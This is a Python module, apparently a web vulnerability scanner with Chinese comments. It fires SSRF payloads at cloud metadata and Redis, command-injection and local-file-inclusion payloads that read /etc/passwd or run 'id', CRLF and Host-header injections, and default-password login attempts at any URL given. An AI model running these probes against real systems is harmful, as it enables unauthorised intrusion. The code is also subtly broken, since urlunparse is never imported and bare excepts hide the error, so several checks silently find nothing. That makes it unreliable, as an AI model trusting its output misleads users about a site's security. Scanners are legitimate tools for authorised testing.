# -*- coding: utf-8 -*-
"""
高级漏洞扫描模块 - 深度检测
"""

import requests
import re
import json
import hashlib
import base64
from typing import List, Dict, Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from config import SCAN_CONFIG


class AdvancedVulnerability:
    """高级漏洞类"""

    def __init__(self, vuln_type: str, severity: str, url: str,
                 description: str, evidence: str = "", remediation: str = "",
                 poc: str = "", cve: str = ""):
        self.vuln_type = vuln_type
        self.severity = severity
        self.url = url
        self.description = description
        self.evidence = evidence
        self.remediation = remediation
        self.poc = poc
        self.cve = cve

    def to_dict(self) -> Dict:
        return {
            "type": self.vuln_type,
            "severity": self.severity,
            "url": self.url,
            "description": self.description,
            "evidence": self.evidence[:500] if self.evidence else "",
            "remediation": self.remediation,
            "poc": self.poc,
            "cve": self.cve,
        }


class AdvancedScanner:
    """高级漏洞扫描器"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": SCAN_CONFIG["user_agent"],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })
        self.vulnerabilities = []

    def scan_target(self, url: str) -> List[AdvancedVulnerability]:
        """深度扫描目标"""
        print(f"[*] 深度扫描: {url}")

        vulns = []

        # 1. API端点发现
        vulns.extend(self._discover_api_endpoints(url))

        # 2. JWT漏洞检测
        vulns.extend(self._check_jwt_vulnerabilities(url))

        # 3. GraphQL漏洞检测
        vulns.extend(self._check_graphql(url))

        # 4. SSRF检测
        vulns.extend(self._check_ssrf(url))

        # 5. 命令注入检测
        vulns.extend(self._check_command_injection(url))

        # 6. 文件包含漏洞
        vulns.extend(self._check_file_inclusion(url))

        # 7. 目录遍历
        vulns.extend(self._check_directory_traversal(url))

        # 8. 未授权访问
        vulns.extend(self._check_unauthorized_access(url))

        # 9. 默认凭证
        vulns.extend(self._check_default_credentials(url))

        # 10. HTTP头注入
        vulns.extend(self._check_header_injection(url))

        # 11. 服务器配置问题
        vulns.extend(self._check_server_misconfig(url))

        # 12. 敏感信息泄露（深度）
        vulns.extend(self._check_deep_info_disclosure(url))

        self.vulnerabilities.extend(vulns)
        return vulns

    def _discover_api_endpoints(self, url: str) -> List[AdvancedVulnerability]:
        """发现API端点"""
        vulns = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 常见API路径
        api_paths = [
            "/api", "/api/v1", "/api/v2", "/api/v3",
            "/api/docs", "/api/swagger", "/api/redoc",
            "/graphql", "/graphiql", "/playground",
            "/rest", "/rest/v1", "/rest/v2",
            "/wp-json", "/wp-json/wp/v2",
            "/api/users", "/api/admin", "/api/config",
            "/api/health", "/api/status", "/api/info",
            "/api/debug", "/api/test", "/api/internal",
        ]

        def check_api(path):
            full_url = urljoin(base, path)
            try:
                resp = self.session.get(full_url, timeout=5, verify=False)
                if resp.status_code == 200:
                    content_type = resp.headers.get("Content-Type", "")
                    if "json" in content_type or "swagger" in resp.text.lower():
                        return AdvancedVulnerability(
                            vuln_type="API端点泄露",
                            severity="Medium",
                            url=full_url,
                            description=f"发现API端点: {path}",
                            evidence=resp.text[:200],
                            remediation="限制API访问权限，添加认证"
                        )
            except:
                pass
            return None

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_api, p) for p in api_paths]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    vulns.append(result)

        return vulns

    def _check_jwt_vulnerabilities(self, url: str) -> List[AdvancedVulnerability]:
        """检测JWT漏洞"""
        vulns = []

        try:
            resp = self.session.get(url, timeout=SCAN_CONFIG["timeout"], verify=False)

            # 查找JWT token
            jwt_patterns = [
                r"eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_.+/=]+",
                r"Bearer\s+eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_.+/=]+",
            ]

            for pattern in jwt_patterns:
                matches = re.findall(pattern, resp.text)
                for jwt_token in matches:
                    # 解码JWT header
                    try:
                        header = jwt_token.split(".")[0]
                        # 补齐base64
                        header += "=" * (4 - len(header) % 4)
                        header_decoded = json.loads(base64.b64decode(header))

                        # 检查alg: none漏洞
                        if header_decoded.get("alg", "").lower() == "none":
                            vulns.append(AdvancedVulnerability(
                                vuln_type="JWT漏洞",
                                severity="Critical",
                                url=url,
                                description="JWT使用none算法，可被伪造",
                                evidence=f"Header: {json.dumps(header_decoded)}",
                                remediation="使用强算法（RS256等），验证签名",
                                poc=f"修改JWT header: {{'alg': 'none', 'typ': 'JWT'}}"
                            ))

                        # 检查弱算法
                        if header_decoded.get("alg", "").upper() in ["HS256", "HS384", "HS512"]:
                            vulns.append(AdvancedVulnerability(
                                vuln_type="JWT弱点",
                                severity="Medium",
                                url=url,
                                description="JWT使用对称算法，可能存在弱密钥",
                                evidence=f"Algorithm: {header_decoded.get('alg')}",
                                remediation="使用非对称算法（RS256等）或强密钥"
                            ))
                    except:
                        continue

        except Exception as e:
            pass

        return vulns

    def _check_graphql(self, url: str) -> List[AdvancedVulnerability]:
        """检测GraphQL漏洞"""
        vulns = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        graphql_paths = ["/graphql", "/graphiql", "/playground", "/api/graphql"]

        for path in graphql_paths:
            full_url = urljoin(base, path)
            try:
                # 测试GraphQL端点
                query = {"query": "{__schema{types{name}}}"}
                resp = self.session.post(full_url, json=query, timeout=5, verify=False)

                if resp.status_code == 200 and "__schema" in resp.text:
                    vulns.append(AdvancedVulnerability(
                        vuln_type="GraphQL漏洞",
                        severity="High",
                        url=full_url,
                        description="GraphQL端点可访问，可能泄露Schema",
                        evidence=resp.text[:200],
                        remediation="限制GraphQL访问，禁用introspection",
                        poc='POST /graphql\n{"query": "{__schema{types{name}}}"}'
                    ))

                    # 测试introspection
                    introspection_query = {
                        "query": """
                        query IntrospectionQuery {
                            __schema {
                                queryType { name }
                                mutationType { name }
                                types {
                                    name
                                    kind
                                    fields {
                                        name
                                        type { name }
                                    }
                                }
                            }
                        }
                        """
                    }
                    resp2 = self.session.post(full_url, json=introspection_query, timeout=5, verify=False)
                    if resp2.status_code == 200 and "mutationType" in resp2.text:
                        vulns.append(AdvancedVulnerability(
                            vuln_type="GraphQL漏洞",
                            severity="High",
                            url=full_url,
                            description="GraphQL introspection已启用，可获取完整Schema",
                            evidence="Introspection query返回完整schema",
                            remediation="禁用introspection查询"
                        ))

            except:
                continue

        return vulns

    def _check_ssrf(self, url: str) -> List[AdvancedVulnerability]:
        """检测SSRF漏洞"""
        vulns = []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # SSRF测试payload
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://0.0.0.0",
            "http://169.254.169.254",  # AWS元数据
            "http://metadata.google.internal",  # GCP元数据
            "file:///etc/passwd",
            "dict://127.0.0.1:6379",  # Redis
            "gopher://127.0.0.1:6379",
        ]

        # 常见SSRF参数名
        ssrf_params = ["url", "uri", "link", "src", "dest", "redirect", "feed", "page", "path"]

        for param_name in params:
            if param_name.lower() in ssrf_params:
                for payload in ssrf_payloads[:3]:  # 测试前3个
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=test_query))

                        resp = self.session.get(test_url, timeout=5, verify=False)

                        # 检查是否成功请求
                        if resp.status_code == 200 and len(resp.text) > 0:
                            vulns.append(AdvancedVulnerability(
                                vuln_type="SSRF",
                                severity="Critical",
                                url=url,
                                description=f"参数 {param_name} 可能存在SSRF漏洞",
                                evidence=f"Payload: {payload}",
                                remediation="验证和限制URL白名单",
                                poc=f"GET {test_url}"
                            ))
                    except:
                        continue

        return vulns

    def _check_command_injection(self, url: str) -> List[AdvancedVulnerability]:
        """检测命令注入"""
        vulns = []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # 命令注入payload
        cmd_payloads = [
            (";id", "uid="),
            ("|id", "uid="),
            ("`id`", "uid="),
            ("$(id)", "uid="),
            (";whoami", None),
            ("|whoami", None),
            (";cat /etc/passwd", "root:"),
            ("|cat /etc/passwd", "root:"),
            (";sleep 5", None),
            ("|sleep 5", None),
        ]

        for param_name, param_values in params.items():
            for payload, indicator in cmd_payloads[:3]:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [param_values[0] + payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))

                    resp = self.session.get(test_url, timeout=10, verify=False)

                    if indicator and indicator in resp.text:
                        vulns.append(AdvancedVulnerability(
                            vuln_type="命令注入",
                            severity="Critical",
                            url=url,
                            description=f"参数 {param_name} 存在命令注入漏洞",
                            evidence=f"Payload: {payload}\n响应包含: {indicator}",
                            remediation="使用白名单验证输入，避免调用系统命令",
                            poc=f"GET {test_url}"
                        ))

                    # 时间盲注
                    if "sleep" in payload and resp.elapsed.total_seconds() > 4:
                        vulns.append(AdvancedVulnerability(
                            vuln_type="命令注入(时间盲注)",
                            severity="Critical",
                            url=url,
                            description=f"参数 {param_name} 可能存在时间盲注",
                            evidence=f"Payload: {payload}\n响应时间: {resp.elapsed.total_seconds()}s",
                            remediation="使用白名单验证输入"
                        ))

                except:
                    continue

        return vulns

    def _check_file_inclusion(self, url: str) -> List[AdvancedVulnerability]:
        """检测文件包含漏洞"""
        vulns = []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        # LFI payload
        lfi_payloads = [
            ("../../../etc/passwd", "root:"),
            ("....//....//....//etc/passwd", "root:"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:"),
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"),
            ("php://input", None),
            ("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+", None),
        ]

        # 常见文件包含参数名
        lfi_params = ["file", "path", "page", "include", "inc", "require", "load", "doc", "document"]

        for param_name in params:
            if param_name.lower() in lfi_params:
                for payload, indicator in lfi_payloads:
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=test_query))

                        resp = self.session.get(test_url, timeout=5, verify=False)

                        if indicator and indicator in resp.text:
                            vulns.append(AdvancedVulnerability(
                                vuln_type="文件包含漏洞",
                                severity="Critical",
                                url=url,
                                description=f"参数 {param_name} 存在本地文件包含漏洞",
                                evidence=f"Payload: {payload}\n响应包含: {indicator}",
                                remediation="使用白名单限制可包含的文件",
                                poc=f"GET {test_url}"
                            ))
                    except:
                        continue

        return vulns

    def _check_directory_traversal(self, url: str) -> List[AdvancedVulnerability]:
        """检测目录遍历"""
        vulns = []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        traversal_payloads = [
            "../",
            "..\\",
            "....//",
            "%2e%2e%2f",
            "%252e%252e%252f",
        ]

        traversal_params = ["file", "path", "dir", "folder", "page", "include"]

        for param_name in params:
            if param_name.lower() in traversal_params:
                for payload in traversal_payloads:
                    try:
                        test_payload = payload * 5 + "etc/passwd"
                        test_params = params.copy()
                        test_params[param_name] = [test_payload]
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=test_query))

                        resp = self.session.get(test_url, timeout=5, verify=False)

                        if "root:" in resp.text:
                            vulns.append(AdvancedVulnerability(
                                vuln_type="目录遍历",
                                severity="High",
                                url=url,
                                description=f"参数 {param_name} 存在目录遍历漏洞",
                                evidence=f"Payload: {test_payload}",
                                remediation="过滤路径遍历字符",
                                poc=f"GET {test_url}"
                            ))
                    except:
                        continue

        return vulns

    def _check_unauthorized_access(self, url: str) -> List[AdvancedVulnerability]:
        """检测未授权访问"""
        vulns = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 敏感路径
        sensitive_paths = [
            "/admin", "/administrator", "/manage", "/dashboard",
            "/console", "/debug", "/test", "/staging",
            "/backup", "/db", "/database", "/phpmyadmin",
            "/adminer", "/wp-admin", "/wp-login.php",
            "/.env", "/.git/config", "/config.php",
            "/server-status", "/server-info",
            "/actuator", "/actuator/env", "/actuator/health",
            "/metrics", "/prometheus", "/grafana",
            "/jenkins", "/ci", "/cd", "/deploy",
            "/api/admin", "/api/users", "/api/config",
            "/internal", "/private", "/secret",
        ]

        def check_access(path):
            full_url = urljoin(base, path)
            try:
                resp = self.session.get(full_url, timeout=5, allow_redirects=False, verify=False)

                # 200状态码且不是重定向
                if resp.status_code == 200:
                    # 排除登录页面
                    if "login" not in resp.text.lower() and "password" not in resp.text.lower()[:500]:
                        return AdvancedVulnerability(
                            vuln_type="未授权访问",
                            severity="High",
                            url=full_url,
                            description=f"敏感路径可未授权访问: {path}",
                            evidence=resp.text[:200],
                            remediation="添加访问控制，要求认证"
                        )
            except:
                pass
            return None

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_access, p) for p in sensitive_paths]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    vulns.append(result)

        return vulns

    def _check_default_credentials(self, url: str) -> List[AdvancedVulnerability]:
        """检测默认凭证"""
        vulns = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 默认凭证列表
        default_creds = [
            ("admin", "admin"),
            ("admin", "123456"),
            ("admin", "password"),
            ("root", "root"),
            ("root", "toor"),
            ("test", "test"),
            ("guest", "guest"),
            ("user", "user"),
        ]

        login_paths = ["/login", "/admin/login", "/wp-login.php", "/api/auth/login"]

        for path in login_paths:
            full_url = urljoin(base, path)
            try:
                resp = self.session.get(full_url, timeout=5, verify=False)

                # 检查是否有登录表单
                if "password" in resp.text.lower() and "submit" in resp.text.lower():
                    # 尝试默认凭证
                    for username, password in default_creds[:3]:
                        try:
                            login_data = {
                                "username": username,
                                "password": password,
                                "user": username,
                                "pass": password,
                                "email": username,
                            }
                            resp2 = self.session.post(full_url, data=login_data, timeout=5, allow_redirects=False, verify=False)

                            # 检查是否登录成功
                            if resp2.status_code in [301, 302] and "dashboard" in resp2.headers.get("Location", "").lower():
                                vulns.append(AdvancedVulnerability(
                                    vuln_type="默认凭证",
                                    severity="Critical",
                                    url=full_url,
                                    description=f"发现默认凭证: {username}/{password}",
                                    evidence=f"登录成功，重定向到dashboard",
                                    remediation="修改默认密码，强制密码复杂度",
                                    poc=f"POST {full_url}\nusername={username}&password={password}"
                                ))
                        except:
                            continue
            except:
                continue

        return vulns

    def _check_header_injection(self, url: str) -> List[AdvancedVulnerability]:
        """检测HTTP头注入"""
        vulns = []

        # 测试Host头注入
        try:
            headers = {"Host": "evil.com"}
            resp = self.session.get(url, headers=headers, timeout=5, allow_redirects=False, verify=False)

            if "evil.com" in resp.text or "evil.com" in resp.headers.get("Location", ""):
                vulns.append(AdvancedVulnerability(
                    vuln_type="Host头注入",
                    severity="High",
                    url=url,
                    description="服务器反射Host头，可能导致缓存投毒",
                    evidence=f"响应包含evil.com",
                    remediation="验证Host头白名单"
                ))
        except:
            pass

        # 测试CRLF注入
        crlf_payloads = [
            "%0d%0aInjected-Header:evil",
            "%0aInjected-Header:evil",
            "\r\nInjected-Header:evil",
        ]

        for payload in crlf_payloads:
            try:
                test_url = f"{url}/{payload}"
                resp = self.session.get(test_url, timeout=5, allow_redirects=False, verify=False)

                if "Injected-Header" in str(resp.headers):
                    vulns.append(AdvancedVulnerability(
                        vuln_type="CRLF注入",
                        severity="High",
                        url=url,
                        description="存在CRLF注入漏洞",
                        evidence=f"Payload: {payload}",
                        remediation="过滤特殊字符"
                    ))
            except:
                continue

        return vulns

    def _check_server_misconfig(self, url: str) -> List[AdvancedVulnerability]:
        """检测服务器配置问题"""
        vulns = []

        try:
            resp = self.session.get(url, timeout=SCAN_CONFIG["timeout"], verify=False)
            headers = resp.headers

            # 检查TRACE方法
            try:
                resp_trace = self.session.request("TRACE", url, timeout=5, verify=False)
                if resp_trace.status_code == 200:
                    vulns.append(AdvancedVulnerability(
                        vuln_type="TRACE方法启用",
                        severity="Medium",
                        url=url,
                        description="服务器启用TRACE方法，可能导致XST攻击",
                        evidence=f"TRACE返回200",
                        remediation="禁用TRACE方法"
                    ))
            except:
                pass

            # 检查PUT方法
            try:
                resp_put = self.session.request("PUT", url, timeout=5, verify=False)
                if resp_put.status_code not in [404, 405, 501]:
                    vulns.append(AdvancedVulnerability(
                        vuln_type="PUT方法启用",
                        severity="Medium",
                        url=url,
                        description="服务器可能启用PUT方法",
                        evidence=f"PUT返回{resp_put.status_code}",
                        remediation="限制HTTP方法"
                    ))
            except:
                pass

            # 检查OPTIONS方法
            try:
                resp_options = self.session.request("OPTIONS", url, timeout=5, verify=False)
                allow = resp_options.headers.get("Allow", "")
                if "TRACE" in allow or "PUT" in allow or "DELETE" in allow:
                    vulns.append(AdvancedVulnerability(
                        vuln_type="危险HTTP方法",
                        severity="Medium",
                        url=url,
                        description=f"服务器允许危险方法: {allow}",
                        evidence=f"Allow: {allow}",
                        remediation="只允许必要的HTTP方法"
                    ))
            except:
                pass

            # 检查安全响应头
            missing_headers = []
            security_headers = {
                "X-Content-Type-Options": "nosniff",
                "X-Frame-Options": ["DENY", "SAMEORIGIN"],
                "X-XSS-Protection": "1",
                "Strict-Transport-Security": "max-age",
                "Content-Security-Policy": "default-src",
                "Referrer-Policy": "no-referrer",
            }

            for header, expected in security_headers.items():
                if header not in headers:
                    missing_headers.append(header)

            if missing_headers:
                vulns.append(AdvancedVulnerability(
                    vuln_type="安全头缺失",
                    severity="Low",
                    url=url,
                    description=f"缺少安全响应头: {', '.join(missing_headers)}",
                    evidence=f"缺失: {', '.join(missing_headers)}",
                    remediation="添加安全响应头"
                ))

        except Exception as e:
            pass

        return vulns

    def _check_deep_info_disclosure(self, url: str) -> List[AdvancedVulnerability]:
        """深度信息泄露检测"""
        vulns = []

        try:
            resp = self.session.get(url, timeout=SCAN_CONFIG["timeout"], verify=False)
            body = resp.text

            # 检查邮箱泄露
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', body)
            if emails:
                vulns.append(AdvancedVulnerability(
                    vuln_type="信息泄露",
                    severity="Medium",
                    url=url,
                    description=f"页面泄露邮箱地址: {len(emails)}个",
                    evidence=", ".join(emails[:5]),
                    remediation="移除页面中的邮箱地址"
                ))

            # 检查IP泄露
            ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', body)
            private_ips = [ip for ip in ips if ip.startswith(("10.", "172.", "192.168."))]
            if private_ips:
                vulns.append(AdvancedVulnerability(
                    vuln_type="信息泄露",
                    severity="Medium",
                    url=url,
                    description=f"页面泄露内网IP地址",
                    evidence=", ".join(private_ips[:5]),
                    remediation="移除页面中的内网IP"
                ))

            # 检查注释泄露
            comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
            sensitive_comments = [c for c in comments if any(kw in c.lower() for kw in ["todo", "fixme", "password", "secret", "key", "token"])]
            if sensitive_comments:
                vulns.append(AdvancedVulnerability(
                    vuln_type="信息泄露",
                    severity="Medium",
                    url=url,
                    description="HTML注释中泄露敏感信息",
                    evidence=sensitive_comments[0][:200],
                    remediation="删除生产环境中的注释"
                ))

            # 检查JS中的敏感信息
            js_patterns = [
                (r'api[_-]?key["\s:=]+["\']?([a-zA-Z0-9]{20,})', "API Key"),
                (r'secret[_-]?key["\s:=]+["\']?([a-zA-Z0-9]{20,})', "Secret Key"),
                (r'password["\s:=]+["\']?([^"\']{8,})', "Password"),
                (r'token["\s:=]+["\']?([a-zA-Z0-9]{20,})', "Token"),
            ]

            for pattern, name in js_patterns:
                matches = re.findall(pattern, body, re.IGNORECASE)
                if matches:
                    vulns.append(AdvancedVulnerability(
                        vuln_type="敏感信息泄露",
                        severity="High",
                        url=url,
                        description=f"页面中泄露{name}",
                        evidence=f"{name}: {matches[0][:30]}...",
                        remediation="移除前端代码中的敏感信息"
                    ))

        except Exception as e:
            pass

        return vulns


def scan_advanced(url: str) -> List[AdvancedVulnerability]:
    """便捷函数：高级扫描"""
    scanner = AdvancedScanner()
    return scanner.scan_target(url)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        vulns = scan_advanced(sys.argv[1])
        for vuln in vulns:
            print(f"[{vuln.severity}] {vuln.vuln_type}: {vuln.url}")
            print(f"  描述: {vuln.description}")
            print()
    else:
        print("用法: python advanced_scanner.py <url>")
